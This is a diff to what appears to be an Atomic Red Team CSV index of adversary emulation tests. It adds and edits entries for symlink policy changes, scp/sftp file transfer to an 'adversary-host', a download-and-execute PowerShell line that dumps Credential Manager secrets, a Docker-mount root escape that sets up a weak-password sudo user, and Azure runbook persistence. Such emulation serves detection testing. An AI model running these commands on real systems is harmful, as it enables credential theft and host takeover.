@@ -184,10 +184,24 @@ input_arguments.cert_export.default: /tmp/certs.pem
 "
 T1222,File and Directory Permissions Modification,Enable Local and Remote Symbolic Links via fsutil,6c4ac96f-d4fa-44f4-83ca-56d8f4a55c02,"Use fsutil to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths.
 [reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)
-",windows,,,"fsutil behavior set SymlinkEvaluation R2L:1 
+",windows,,,"fsutil behavior set SymlinkEvaluation R2L:1
 fsutil behavior set SymlinkEvaluation R2R:1
 ",command_prompt,True,,"fsutil behavior set SymlinkEvaluation R2L:0
 fsutil behavior set SymlinkEvaluation R2R:0
+",,,
+T1222,File and Directory Permissions Modification,Enable Local and Remote Symbolic Links via reg.exe,78bef0d4-57fb-417d-a67a-b75ae02ea3ab,"Use reg.exe to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths.
+[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)
+",windows,,,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d ""1"" /f
+reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d ""1"" /f
+",command_prompt,True,,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d ""0"" /f
+reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d ""0"" /f
+",,,
+T1222,File and Directory Permissions Modification,Enable Local and Remote Symbolic Links via Powershell,6cd715aa-20ac-4be1-a8f1-dda7bae160bd,"Use Powershell to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths.
+[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)
+",windows,,,"New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore
+New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore
+",powershell,True,,"New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 0 -Force -ErrorAction Ignore
+New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 0 -Force -ErrorAction Ignore
 ",,,
 T1207,Rogue Domain Controller,DCShadow (Active Directory),0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6,"Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.
 
@@ -1157,6 +1171,168 @@ input_arguments.file_name.description: Name of the file to transfer
 input_arguments.file_name.type: string
 
 input_arguments.file_name.default: T1105.txt
+
+input_arguments.username.description: User account to authenticate on remote host
+
+input_arguments.username.type: string
+
+input_arguments.username.default: adversary
+
+"
+T1105,Ingress Tool Transfer,Windows pull file using scp.exe,401667dc-05a6-4da0-a2a7-acfe4819559c,"This test simulates pulling files using SCP on a Windows environment.
+",windows,,,"scp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
+",powershell,True,,,powershell,"dependencies.0.description: This test requires the `scp` command to be available on the system.
+
+dependencies.0.prereq_command: if (Get-Command scp -ErrorAction SilentlyContinue) {
+    Write-Output ""SCP command is available.""
+    exit 0
+} else {
+    Write-Output ""SCP command is not available.""
+    exit 1
+}
+
+dependencies.0.get_prereq_command: # Define the capability name for OpenSSH Client
+$capabilityName = ""OpenSSH.Client~~~~0.0.1.0""
+try {
+    # Install the OpenSSH Client capability
+    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
+    Write-Host ""OpenSSH Client has been successfully installed."" -ForegroundColor Green
+} catch {
+    # Handle any errors that occur during the installation process
+    Write-Host ""An error occurred while installing OpenSSH Client: $_"" -ForegroundColor Red
+}
+
+","input_arguments.remote_path.description: Path of folder to pull
+
+input_arguments.remote_path.type: path
+
+input_arguments.remote_path.default: /tmp/T1105.txt
+
+input_arguments.remote_host.description: Remote host to pull from
+
+input_arguments.remote_host.type: string
+
+input_arguments.remote_host.default: adversary-host
+
+input_arguments.local_path.description: Local path to receive files
+
+input_arguments.local_path.type: path
+
+input_arguments.local_path.default: C:\temp
+
+input_arguments.username.description: User account to authenticate on remote host
+
+input_arguments.username.type: string
+
+input_arguments.username.default: adversary
+
+"
+T1105,Ingress Tool Transfer,Windows push file using sftp.exe,205e676e-0401-4bae-83a5-94b8c5daeb22,"This test simulates pushing files using SFTP on a Windows environment.
+",windows,,,"# Check if the folder exists, create it if it doesn't
+$folderPath = ""#{local_path}""
+if (-Not (Test-Path -Path $folderPath)) {
+    New-Item -Path $folderPath -ItemType Directory
+}
+# Create the file
+$filePath = Join-Path -Path $folderPath -ChildPath ""#{file_name}""
+New-Item -Path $filePath -ItemType File -Force
+Write-Output ""File created: $filePath""
+# Attack command
+echo ""put #{local_path}\#{file_name}"" | sftp #{username}@#{remote_host}:#{remote_path}
+",powershell,True,,"$filePath = Join-Path -Path ""#{local_path}"" -ChildPath ""#{file_name}""
+Remove-Item -Path $filePath -Force
+Write-Output ""File deleted: $filePath""
+",powershell,"dependencies.0.description: This test requires the `sftp` command to be available on the system.
+
+dependencies.0.prereq_command: if (Get-Command sftp -ErrorAction SilentlyContinue) {
+    Write-Output ""SFTP command is available.""
+    exit 0
+} else {
+    Write-Output ""SFTP command is not available.""
+    exit 1
+}
+
+dependencies.0.get_prereq_command: # Define the capability name for OpenSSH Client
+$capabilityName = ""OpenSSH.Client~~~~0.0.1.0""
+try {
+    # Install the OpenSSH Client capability
+    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
+    Write-Host ""OpenSSH Client has been successfully installed."" -ForegroundColor Green
+} catch {
+    # Handle any errors that occur during the installation process
+    Write-Host ""An error occurred while installing OpenSSH Client: $_"" -ForegroundColor Red
+}
+
+","input_arguments.remote_path.description: Path of folder to copy
+
+input_arguments.remote_path.type: path
+
+input_arguments.remote_path.default: /tmp
+
+input_arguments.remote_host.description: Remote host to send
+
+input_arguments.remote_host.type: string
+
+input_arguments.remote_host.default: adversary-host
+
+input_arguments.local_path.description: Local path to receive sftp
+
+input_arguments.local_path.type: path
+
+input_arguments.local_path.default: C:\temp
+
+input_arguments.file_name.description: Name of the file to transfer
+
+input_arguments.file_name.type: string
+
+input_arguments.file_name.default: T1105.txt
+
+input_arguments.username.description: User account to authenticate on remote host
+
+input_arguments.username.type: string
+
+input_arguments.username.default: adversary
+
+"
+T1105,Ingress Tool Transfer,Windows pull file using sftp.exe,3d25f1f2-55cb-4a41-a523-d17ad4cfba19,"This test simulates pulling files using SFTP on a Windows environment.
+",windows,,,sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path},powershell,True,,,powershell,"dependencies.0.description: This test requires the `sftp` command to be available on the system.
+
+dependencies.0.prereq_command: if (Get-Command sftp -ErrorAction SilentlyContinue) {
+    Write-Output ""SFTP command is available.""
+    exit 0
+} else {
+    Write-Output ""SFTP command is not available.""
+    exit 1
+}
+
+dependencies.0.get_prereq_command: # Define the capability name for OpenSSH Client
+$capabilityName = ""OpenSSH.Client~~~~0.0.1.0""
+try {
+    # Install the OpenSSH Client capability
+    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
+    Write-Host ""OpenSSH Client has been successfully installed."" -ForegroundColor Green
+} catch {
+    # Handle any errors that occur during the installation process
+    Write-Host ""An error occurred while installing OpenSSH Client: $_"" -ForegroundColor Red
+}
+
+","input_arguments.remote_path.description: Path of file to pull
+
+input_arguments.remote_path.type: path
+
+input_arguments.remote_path.default: /tmp/T1105.txt
+
+input_arguments.remote_host.description: Remote host to pull from
+
+input_arguments.remote_host.type: string
+
+input_arguments.remote_host.default: adversary-host
+
+input_arguments.local_path.description: Local path to receive files
+
+input_arguments.local_path.type: path
+
+input_arguments.local_path.default: C:\temp
 
 input_arguments.username.description: User account to authenticate on remote host
 
@@ -7373,9 +7549,9 @@ dependencies.0.prereq_command: try {
 dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word manually to meet this requirement""
 
 ",
-T1555,Credentials from Password Stores,Dump credentials from Windows Credential Manager With PowerShell [windows Credentials],c89becbe-1758-4e7d-a0f4-97d2188a23e3,This module will extract the credentials from Windows Credential Manager,windows,,,"IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   
+T1555,Credentials from Password Stores,Dump credentials from Windows Credential Manager With PowerShell [windows Credentials],c89becbe-1758-4e7d-a0f4-97d2188a23e3,This module will extract the credentials from Windows Credential Manager,windows,,,"IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   
 ",powershell,False,,,,,
-T1555,Credentials from Password Stores,Dump credentials from Windows Credential Manager With PowerShell [web Credentials],8fd5a296-6772-4766-9991-ff4e92af7240,This module will extract the credentials from Windows Credential Manager,windows,,,"IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
+T1555,Credentials from Password Stores,Dump credentials from Windows Credential Manager With PowerShell [web Credentials],8fd5a296-6772-4766-9991-ff4e92af7240,This module will extract the credentials from Windows Credential Manager,windows,,,"IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
 ",powershell,False,,,,,
 T1555,Credentials from Password Stores,Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials],36753ded-e5c4-4eb5-bc3c-e8fba236878d,This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe,windows,,,"vaultcmd /listcreds:""Windows Credentials"" /all
 ",powershell,False,,,,,
@@ -13278,6 +13454,34 @@ input_arguments.listen_port.description: TCP Port to listen on for callback from
 input_arguments.listen_port.type: integer
 
 input_arguments.listen_port.default: 4444
+
+"
+T1611,Escape to Host,Privilege Escalation via Docker Volume Mapping,39fab1bc-fcb9-406f-bc2e-fe03e42ff0e4,"This test demonstrates privilege escalation by abusing Docker's volume mapping
+feature to gain access to the host file system. By mounting the root directory
+of the host into a Docker container, the attacker can use chroot to operate as
+root on the host system.
+",containers,,,"echo ""Current user: #{username}""
+sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id""
+",sh,True,,"USERNAME=""#{username}""; SUDOERS_FILE=""/etc/sudoers.d/$USERNAME""; id ""$USERNAME"" &>/dev/null && userdel -r ""$USERNAME"" && echo -e ""$USERNAME is deleted.""; [[ -f ""$SUDOERS_FILE"" ]] && rm -f ""$SUDOERS_FILE""; echo ""Cleanup complete.""
+",,"dependencies.0.description: Docker
+dependencies.0.prereq_command: command -v docker &> /dev/null && echo ""Docker is installed"" || { echo ""Docker is not installed.""; exit 1; }
+
+dependencies.0.get_prereq_command: echo ""You should install docker manually.""
+
+dependencies.1.description: Docker Privileged User
+dependencies.1.prereq_command: sudo -l -U #{username} | grep ""(ALL) NOPASSWD: /usr/bin/docker""
+
+dependencies.1.get_prereq_command: USERNAME=""#{username}""
+PASSWORD=""password123""
+SUDO_COMMAND=""/usr/bin/docker""
+SUDOERS_FILE=""/etc/sudoers.d/$USERNAME""
+[[ $EUID -ne 0 ]] && echo ""Run as root."" && exit 1; id ""$USERNAME"" &>/dev/null || { useradd -m -s /bin/bash ""$USERNAME"" && echo ""$USERNAME:$PASSWORD"" | chpasswd; }; [[ -f ""$SUDOERS_FILE"" ]] || { echo ""$USERNAME ALL=(ALL) NOPASSWD: $SUDO_COMMAND"" > ""$SUDOERS_FILE"" && chmod 440 ""$SUDOERS_FILE""; }; echo ""Setup complete. User: $USERNAME, Password: $PASSWORD""
+
+","input_arguments.username.default: docker_user
+
+input_arguments.username.description: Username that run attack command
+
+input_arguments.username.type: string
 
 "
 T1001.002,Data Obfuscation via Steganography,Steganographic Tarball Embedding,c7921449-8b62-4c4d-8a83-d9281ac0190b,"This atomic test, named ""Steganographic Tarball Embedding"", simulates the technique of data obfuscation via steganography by embedding a tar archive file (tarball) 
@@ -21093,68 +21297,64 @@ input_arguments.output-key-file.default: gcp-art-service-account-1.json
 "
 T1078.004,Valid Accounts: Cloud Accounts,Azure Persistence Automation Runbook Created or Modified,348f4d14-4bd3-4f6b-bd8a-61237f78b3ac,"Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure
 Automation runbook to execute malicious code and maintain persistence in their target's environment.
-",iaas:azure,,,"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
-Connect-AzAccount -Credential $creds
-New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}
+",iaas:azure,,,"New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}
 ",powershell,False,,"Remove-AzAutomationRunbook -AutomationAccountName #{automation_account_name} -Name #{runbook_name} -ResourceGroupName #{resource_group} -Force
+Remove-AzAutomationAccount -ResourceGroupName #{resource_group} -Name #{automation_account_name} -Force
+Remove-AzResourceGroup -Name #{resource_group} -Force
+echo ""Cleanup should be completed. Run 'terraform destroy` to ensure remaining resources are also deleted.""
 cd ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
 terraform destroy -auto-approve
 ",powershell,"dependencies.0.description: Check if terraform is installed.
 
 dependencies.0.prereq_command: terraform version
 
-dependencies.0.get_prereq_command: echo Please install terraform.
+dependencies.0.get_prereq_command: echo ""Please install terraform via https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli (URL accurate as of Nov. 15, 2024).""
 
-dependencies.1.description: Install-Module -Name Az
+dependencies.1.description: Check if Azure CLI and Azure Powershell are installed.
+
+* Login to Azure CLI with ""az login"", and login to Azure Powershell with ""Connect-AzAccount"". Sessions are not shared.
+* Azure Powershell used in this test as they have better automation performance and error logging than Azure CLI.
 
 dependencies.1.prereq_command: try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
 
-dependencies.1.get_prereq_command: Install-Module -Name Az -Scope CurrentUser -Force
+dependencies.1.get_prereq_command: $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\AzureCLI.msi
 
 dependencies.2.description: Check if the user is logged into Azure.
 
-dependencies.2.prereq_command: az account show
+dependencies.2.prereq_command: try {if (-not (Get-AzContext)) { exit 1 } else { exit 0 }} catch {exit 1}
 
-dependencies.2.get_prereq_command: echo Configure your Azure account using: az login. 
+dependencies.2.get_prereq_command: echo ""* Configure your Azure account using: Connect-AzAccount""
 
 dependencies.3.description: Create dependency resources using terraform
 
+* If fail to meet prereq, navigate to T1078.004-2 using ""cd $PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
+* Open the ""terraform.tfvars"" file and fill in the variables with your desired values.
+* Re-run -GetPrereqs
+
 dependencies.3.prereq_command: try {if (Test-Path ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/terraform.tfstate"" ){ exit 0 } else {exit 1}} catch {exit 1}
 
-dependencies.3.get_prereq_command: cd ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
+dependencies.3.get_prereq_command: echo ""Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
+cd ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
 terraform init
 terraform apply -auto-approve
 
-","input_arguments.username.description: Azure username
-
-input_arguments.username.type: string
-
-input_arguments.username.default: None
-
-input_arguments.password.description: Azure password
-
-input_arguments.password.type: string
-
-input_arguments.password.default: None
-
-input_arguments.resource_group.description: Name of the resource group
+","input_arguments.resource_group.description: Name of the resource group
 
 input_arguments.resource_group.type: string
 
-input_arguments.resource_group.default: None
+input_arguments.resource_group.default: ART-ResourceGroupName-T1078-004
 
 input_arguments.runbook_name.description: Name of the runbook name
 
 input_arguments.runbook_name.type: string
 
-input_arguments.runbook_name.default: None
+input_arguments.runbook_name.default: ART-RunbookName-T1078-004
 
 input_arguments.automation_account_name.description: Name of the automation account name
 
 input_arguments.automation_account_name.type: string
 
-input_arguments.automation_account_name.default: None
+input_arguments.automation_account_name.default: ART-AutomationAccountName-T1078-004
 
 "
 T1078.004,Valid Accounts: Cloud Accounts,GCP - Create Custom IAM Role,3a159042-69e6-4398-9a69-3308a4841c85,"This atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get*. The idea for this Atomic came from a Rule published by the Elastic team.
